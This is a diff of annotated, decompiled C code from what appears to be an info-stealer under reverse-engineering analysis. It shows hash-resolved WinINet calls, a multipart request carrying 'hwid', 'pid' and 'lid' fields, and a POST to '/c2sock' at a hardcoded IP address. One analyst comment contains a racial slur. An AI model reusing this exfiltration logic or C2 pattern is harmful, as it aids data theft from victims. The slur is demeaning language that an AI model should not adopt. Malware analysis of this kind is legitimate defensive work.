@@ -38,7 +38,11 @@ size_t __cdecl PrcssingMultipartRequest(void *dataToSend, size_t dataSize, size_
     return resultSize;
 }
 
-int __cdecl WinnetDllFuncRelated(const char *postData, int dataSize, int extraParam, PSTR IPaddrs)
+int __cdecl 
+WinnetDllFuncRelatedExfiltrationRoutineetc(const char *header_p_SysInfo, 
+                                           int extraParam, 
+                                           int dataSize, 
+                                           PSTR IPaddrs)
 { /*
     WinnetDllFuncRelated:
     =====================
@@ -58,7 +62,7 @@ int __cdecl WinnetDllFuncRelated(const char *postData, int dataSize, int extraPa
     int (__stdcall *HttpOpenRequestA_Func)(int, const char *, const char *, _DWORD, _DWORD, _DWORD, _DWORD, int);
     int (__stdcall *HttpSendRequestA_Func)(int, const char *, unsigned int, int, int);
     int (__stdcall *InternetCloseHandle_Func)(int);
-    unsigned int postDataLength;
+    unsigned int headersLenght;
 
     InternetOpenA_Func = (int (__stdcall *)(const char *, _DWORD, _DWORD, _DWORD, _DWORD))ResolveTheHash(
         -1221180948, (int)L"wininet.dll");
@@ -76,10 +80,10 @@ int __cdecl WinnetDllFuncRelated(const char *postData, int dataSize, int extraPa
         2073911457, (int)L"wininet.dll");
     requestHandle = HttpOpenRequestA_Func(connectionHandle, "POST", "/c2sock", 0, 0, 0, 0, 1);
 
-    postDataLength = strlen(postData);
+    headersLenght = strlen(header_p_SysInfo);
     HttpSendRequestA_Func = (int (__stdcall *)(int, const char *, unsigned int, int, int))ResolveTheHash(
         -1388942586, (int)L"wininet.dll");
-    HttpSendRequestA_Func(requestHandle, postData, postDataLength, dataSize, extraParam);
+    HttpSendRequestA_Func(requestHandle, header_p_SysInfo, headersLenght, extraParam, dataSize);
 
     InternetCloseHandle_Func = (int (__stdcall *)(int))ResolveTheHash(1607704873, (int)L"wininet.dll");
     InternetCloseHandle_Func(sessionHandle);
@@ -143,7 +147,7 @@ int32_t __fastcall ProcessAndSendData(int32_t* SysInfo)
     ProcessedUserID = *((unsigned __int16 *)SysInfo + 2);
     
     char* header_p_SysInfo = (char *)malloc(2048);
-    void* responseStatus = malloc(_p_SysInfo + 4096);
+    void* DATA = malloc(_p_SysInfo + 4096);
     PSTR formattedData = ProccessingOrMapsTheWideCharacter(&globalData);
     // that globalData are awesome, is some next-level trash -_-, just a hardcoded mess with random junk like "aj195iak20ka99441aj1". This "genius" dev thinks this is clever, but nah—it’s probably some weak attempt at generating a HWID or a stolen key for auth, who knows? It's like they couldn't even come up with a real idea.  
     // they take that mangled mess and throw it into a multipart HTTP request with "Content-Type: multipart/form-data; boundary=". Nigga WWtf is that, This is their big idea? Sending stolen info in the most obvious way possible?  
@@ -163,12 +167,12 @@ int32_t __fastcall ProcessAndSendData(int32_t* SysInfo)
     ShortSessionToken = (char *)malloc(5u);
     ProcessUserOrSystemData(ProcessedUserID, ShortSessionToken, 10);
     PrcssingMultipartRequest(Block, _p_SysInfo, (size_t *)&ProcessedUserID0);
-    AddRequestParameter((int)responseStatus, "hwid", RequestID, (unsigned int *)&ProcessedUserID0);
-    AddRequestParameter((int)responseStatus, "pid", ShortSessionToken, (unsigned int *)&ProcessedUserID0);
-    AddRequestParameter((int)responseStatus, "lid", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", (unsigned int *)&ProcessedUserID0);
+    AddRequestParameter((int)DATA, "hwid", RequestID, (unsigned int *)&ProcessedUserID0);
+    AddRequestParameter((int)DATA, "pid", ShortSessionToken, (unsigned int *)&ProcessedUserID0);
+    AddRequestParameter((int)DATA, "lid", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", (unsigned int *)&ProcessedUserID0);
     
     PSTR ip195 = ProccessingOrMapsTheWideCharacter(L"195.123.226.91");
-    WinnetDllFuncRelated(header_p_SysInfo, (int)responseStatus, DataSizeCounter, ip195);
+    WinnetDllFuncRelatedExfiltrationRoutineetc(header_p_SysInfo, (int)DATA, DataSizeCounter, ip195);
     
     return _free(Block);
 }
